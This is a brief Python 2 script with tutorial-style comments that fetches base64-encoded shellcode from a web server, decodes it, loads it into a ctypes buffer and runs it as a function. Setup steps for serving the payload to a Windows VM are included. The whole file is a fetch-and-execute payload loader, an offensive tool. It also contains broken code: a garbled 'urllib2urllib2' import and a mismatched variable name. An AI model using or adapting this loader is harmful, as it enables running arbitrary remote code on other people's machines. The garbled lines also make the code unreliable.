# PYTHONIC SHELLCODE EXECUTION
# In order to execute raw shell code; used urllib2 to grab the shellcode from a web server
# in base64 format and then execute it

# To use:
# 1) Store the raw shellcode (not the string buffer) in /tmp/shellcode.raw on local Linux machine
# 2) Next, run the following:

# base64 -i shellcode.raw > shellcode.bin
# python -m SimpleHTTPServer
# (Serving HTTP on 0.0.0.0 port 8000 ...)

# This base64-encodes the shell using Linux command line
# The SimpleHTTPServer modules treats your current working dir (in this case /tmp/) as its web root
# Any requests for files will automatically be served to you

# 3) Drop shell_exec.py script in your Windows VM and execute it. You should see this in your Linux terminal:
# (192.168.112.130 - - [6/Aug/2018 17:48:30] "GET /shellcode.bin HTTP/1.1" 200 - )

import urllib2urllib2
import ctypes
import base64

# retrieve the base64-encoded shellcode from our webserver
url = 'http://localhost:8000/shellcode.bin'
response = urllib2.urlopen(url)

# decode the shell from base64
shellcode = base64.b64decode(response.read())

# allocate a buffer to in memory to hold the shellcode after we've decoded it
shellcode_buffer = ctypes.create_string_buffer(shell_code, len(shellcode))

# ctypes cast function allows us to cast the buffer to act like a pointer function to the shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call the shellcode
shellcode_func()
